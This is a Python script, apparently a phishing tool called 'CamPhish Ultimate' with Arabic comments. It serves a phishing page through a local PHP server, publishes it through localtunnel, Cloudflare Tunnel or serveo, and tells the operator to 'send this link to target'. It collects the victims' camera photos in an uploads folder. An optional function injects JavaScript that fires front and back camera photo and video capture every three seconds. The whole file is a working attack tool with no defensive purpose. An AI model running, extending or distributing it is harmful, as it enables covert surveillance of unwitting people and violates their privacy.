#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CamPhish Ultimate - بدون ngrok، يدعم localtunnel / Cloudflare Tunnel / serveo
التقاط صور لا نهائية وإرسالها إلى مجلد uploads على نفس الجهاز
"""

import subprocess
import time
import re
import shutil
import sys
import os
import random
import signal
import logging
import socket
import threading
from datetime import datetime
from pathlib import Path

# ===================== التثبيت التلقائي للمكتبات =====================
def auto_install_packages():
    required = ['watchdog', 'colorama', 'requests']
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Installing {pkg} ...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'],
                           check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

auto_install_packages()

import requests
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from colorama import init, Fore, Style

init(autoreset=True)

# ===================== الإعدادات الأساسية =====================
LOG_FILE = "camphish.log"
FOLDER_TO_WATCH = "uploads"
PHP_FOLDER = "./"
INDEX = "index.html"
MIN_PORT = 8000
MAX_PORT = 8999

logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def log(msg, level="info"):
    colors = {"info": Fore.CYAN, "success": Fore.GREEN, "error": Fore.RED, "warning": Fore.YELLOW}
    print(f"{colors.get(level, Fore.WHITE)}[{level.upper()}] {msg}{Style.RESET_ALL}")
    getattr(logging, level)(msg)

def clear():
    os.system("cls || clear")

def is_termux():
    return os.path.exists("/data/data/com.termux")

def is_linux():
    return sys.platform.startswith('linux') and not is_termux()

def get_free_port():
    """الحصول على منفذ غير مستخدم"""
    for _ in range(20):
        port = random.randint(MIN_PORT, MAX_PORT)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('localhost', port)) != 0:
                return port
    return 8080

# ===================== فحص وتثبيت المتطلبات =====================
def check_php():
    if shutil.which("php"):
        return True
    log("PHP not found, installing...", "warning")
    try:
        if is_termux():
            subprocess.run(["pkg", "update", "-y"], check=False, stdout=subprocess.DEVNULL)
            subprocess.run(["pkg", "install", "php", "-y"], check=True, stdout=subprocess.DEVNULL)
        elif is_linux():
            subprocess.run(["sudo", "apt", "update"], check=False, stdout=subprocess.DEVNULL)
            subprocess.run(["sudo", "apt", "install", "php", "-y"], check=True, stdout=subprocess.DEVNULL)
        else:
            log("Windows: install PHP manually from https://windows.php.net/download", "error")
            return False
        return True
    except:
        log("PHP installation failed", "error")
        return False

def install_localtunnel():
    """تثبيت localtunnel عبر npm (إذا كان npm متوفراً)"""
    if shutil.which("lt"):
        return True
    if shutil.which("npm"):
        log("Installing localtunnel via npm...", "info")
        subprocess.run(["npm", "install", "-g", "localtunnel"], check=False, stdout=subprocess.DEVNULL)
        return shutil.which("lt") is not None
    log("npm not found, localtunnel unavailable. Install Node.js first.", "error")
    return False

def install_cloudflared():
    """تثبيت cloudflared"""
    if shutil.which("cloudflared"):
        return True
    log("Installing cloudflared...", "info")
    try:
        if is_termux():
            subprocess.run(["pkg", "install", "cloudflared", "-y"], check=False, stdout=subprocess.DEVNULL)
        elif is_linux():
            # تحميل الملف الثنائي
            subprocess.run(["wget", "-q", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "-O", "/tmp/cloudflared"], check=False)
            subprocess.run(["chmod", "+x", "/tmp/cloudflared"], check=False)
            subprocess.run(["sudo", "mv", "/tmp/cloudflared", "/usr/local/bin/cloudflared"], check=False)
        else:
            log("Windows: download cloudflared from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", "error")
            return False
        return shutil.which("cloudflared") is not None
    except:
        return False

def install_serveo():
    """serveo لا يحتاج تثبيت، فقط ssh"""
    return shutil.which("ssh") is not None

# ===================== تشغيل النفق =====================
def start_localtunnel(port):
    """تشغيل localtunnel وإرجاع الرابط"""
    try:
        proc = subprocess.Popen(["lt", "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # الانتظار للحصول على الرابط من stdout
        time.sleep(4)
        # قراءة الرابط من المخرجات
        for line in iter(proc.stdout.readline, ''):
            if "your url is:" in line.lower():
                url = line.split()[-1].strip()
                return proc, url
            if "https://" in line:
                parts = line.split()
                for p in parts:
                    if p.startswith("https://"):
                        return proc, p
        return proc, None
    except Exception as e:
        log(f"localtunnel error: {e}", "error")
        return None, None

def start_cloudflared(port):
    """تشغيل cloudflared tunnel"""
    try:
        proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(5)
        # قراءة الرابط من stderr (cloudflared يكتبه هناك عادة)
        for _ in range(20):
            line = proc.stderr.readline()
            if line:
                if "https://" in line:
                    match = re.search(r'https://[a-zA-Z0-9\-\.]+\.trycloudflare\.com', line)
                    if match:
                        return proc, match.group(0)
            time.sleep(0.5)
        return proc, None
    except Exception as e:
        log(f"cloudflared error: {e}", "error")
        return None, None

def start_serveo(port):
    """تشغيل serveo عبر SSH"""
    try:
        # serveo يتطلب اسم مضيف فرعي عشوائي أو ثابت
        proc = subprocess.Popen(["ssh", "-R", "80:localhost:" + str(port), "serveo.net"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(6)
        # استخراج الرابط من المخرجات
        for _ in range(20):
            line = proc.stderr.readline()
            if line and "Forwarding HTTP traffic from" in line:
                match = re.search(r'https://[a-zA-Z0-9\-\.]+\.serveo\.net', line)
                if match:
                    return proc, match.group(0)
            time.sleep(0.5)
        return proc, None
    except:
        return None, None

# ===================== تشغيل خادم PHP =====================
def start_php_server(port):
    log(f"Starting PHP server on port {port}...", "info")
    proc = subprocess.Popen(["php", "-S", f"0.0.0.0:{port}"],
                            cwd=PHP_FOLDER,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
    time.sleep(2)
    return proc

# ===================== إعداد الصفحة لالتقاط لا نهائي =====================
def configure_infinite_capture():
    """تعديل index.html لجعل الالتقاط لا نهائياً (تكرار تلقائي)"""
    try:
        with open(INDEX, 'r', encoding='utf-8') as f:
            content = f.read()
        # تعديل المتغيرات إذا وجدت لتكرار غير محدود (مثال: ضبط عدد الصور والفيديو على قيمة عالية)
        # إضافة حلقة لا نهائية إذا أمكن
        # سنقوم بتعديل المحتوى لجعل زر التقاط يكرر نفسه أو تعيين الفاصل الزمني
        # هذا يعتمد على هيكل index.html، لكن سنضيف كود JS يجعل التصوير يتكرر كل 5 ثوانٍ
        search_tag = "</body>"
        auto_js = """
<script>
// التقاط تلقائي لا نهائي
setInterval(function() {
    if (typeof captureFrontPhoto === 'function') captureFrontPhoto();
    if (typeof captureBackPhoto === 'function') captureBackPhoto();
    if (typeof captureFrontVideo === 'function') captureFrontVideo();
    if (typeof captureBackVideo === 'function') captureBackVideo();
}, 3000); // كل 3 ثوانٍ التقط صورة
</script>
"""
        if auto_js not in content:
            content = content.replace(search_tag, auto_js + "\n" + search_tag)
            with open(INDEX, 'w', encoding='utf-8') as f:
                f.write(content)
            log("Page modified for infinite capture (auto capture every 3 seconds)", "success")
        else:
            log("Infinite capture already configured", "info")
    except Exception as e:
        log(f"Failed to modify index.html: {e}", "error")

# ===================== مراقب الملفات =====================
class WatcherHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            file_name = os.path.basename(event.src_path)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log(f"File received: {file_name} at {timestamp}", "success")

# ===================== عرض الشعار =====================
def show_banner():
    banner = f"""{Fore.CYAN}
   ▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
  ██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
  ▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
    {Fore.RED}CamPhish Ultimate - No ngrok, Infinite Capture{Style.RESET_ALL}
    {Fore.YELLOW}Git & TG: @mr-spect3r{Style.RESET_ALL}

"""
    print(banner)

# ===================== اختيار طريقة النشر =====================
def select_tunnel_method():
    print(f"{Fore.GREEN}Select tunnel method:")
    print("1) localtunnel (requires Node.js/npm)")
    print("2) Cloudflare Tunnel (cloudflared)")
    print("3) Serveo (requires SSH)")
    choice = input(f"{Fore.YELLOW}Enter choice (1/2/3): {Style.RESET_ALL}").strip()
    if choice == '1':
        if install_localtunnel():
            return "localtunnel"
        else:
            log("Localtunnel not available, try another method", "error")
            return select_tunnel_method()
    elif choice == '2':
        if install_cloudflared():
            return "cloudflared"
        else:
            log("Cloudflared not available", "error")
            return select_tunnel_method()
    elif choice == '3':
        if install_serveo():
            return "serveo"
        else:
            log("SSH not found, install openssh-client", "error")
            return select_tunnel_method()
    else:
        return select_tunnel_method()

# ===================== إعداد البيئة =====================
def prepare():
    if not os.path.exists(FOLDER_TO_WATCH):
        os.makedirs(FOLDER_TO_WATCH)
    if not os.path.exists(INDEX):
        log(f"File {INDEX} not found in current directory!", "error")
        sys.exit(1)
    if not check_php():
        sys.exit(1)
    # طلب صلاحية التخزين لـ Termux
    if is_termux():
        subprocess.run(["termux-setup-storage"], check=False)
    # تعديل الصفحة للالتقاط اللا نهائي (اختياري)
    inf_choice = input(f"{Fore.CYAN}Enable infinite automatic capture? (y/n): {Style.RESET_ALL}").upper()
    if inf_choice == 'Y':
        configure_infinite_capture()

# ======================== MAIN ========================
def main():
    clear()
    show_banner()
    prepare()

    port = get_free_port()
    php_proc = start_php_server(port)
    if not php_proc:
        log("Failed to start PHP server", "error")
        sys.exit(1)

    method = select_tunnel_method()
    tunnel_proc = None
    public_url = None

    if method == "localtunnel":
        tunnel_proc, public_url = start_localtunnel(port)
    elif method == "cloudflared":
        tunnel_proc, public_url = start_cloudflared(port)
    elif method == "serveo":
        tunnel_proc, public_url = start_serveo(port)

    if not public_url:
        log("Failed to obtain public URL from tunnel service", "error")
        # خادم PHP يعمل محلياً، يمكن عرض IP المحلي كبديل
        local_ip = socket.gethostbyname(socket.gethostname())
        print(f"{Fore.YELLOW}Local IP: http://{local_ip}:{port}{Style.RESET_ALL}")
        print(f"{Fore.RED}No public URL. Use ngrok or other service manually.{Style.RESET_ALL}")
    else:
        log(f"Public URL: {Fore.GREEN}{public_url}{Style.RESET_ALL}", "success")
        print(f"{Fore.YELLOW}Send this link to target. All photos will be saved in '{FOLDER_TO_WATCH}' folder.{Style.RESET_ALL}\n")

    # مراقبة مجلد uploads
    event_handler = WatcherHandler()
    observer = Observer()
    observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
    observer.start()
    log(f"Watching folder '{FOLDER_TO_WATCH}' for incoming files...", "info")
    log("Press Ctrl+C to stop.", "warning")

    def shutdown(sig, frame):
        log("Shutting down...", "warning")
        php_proc.terminate()
        if tunnel_proc:
            tunnel_proc.terminate()
        observer.stop()
        observer.join()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        shutdown(None, None)

if __name__ == "__main__":
    main()
